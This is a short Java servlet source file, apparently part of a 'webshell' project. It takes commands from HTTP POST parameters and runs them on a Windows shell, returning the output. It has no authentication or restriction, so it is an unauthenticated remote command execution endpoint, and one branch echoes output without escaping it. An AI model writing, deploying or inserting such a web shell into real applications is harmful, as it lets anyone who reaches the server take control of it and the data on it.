package eu.jcrons.webshell;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ShellServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    private WindowsShell shell;

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        String parameter = req.getParameter("type");

        if (parameter.equals("init")) {
            shell = new WindowsShell();
            String command = req.getParameter("value");
            String result = shell.execute(command);
            resp.getWriter().write(result);
        } else if (parameter.equals("command")) {
            String command = req.getParameter("value");
            String result = shell.execute(command);
            result = result.replaceAll("<", "&lt;");
            result = result.replaceAll(">", "&gt;");
            resp.getWriter().write(result);
        }

    }

}
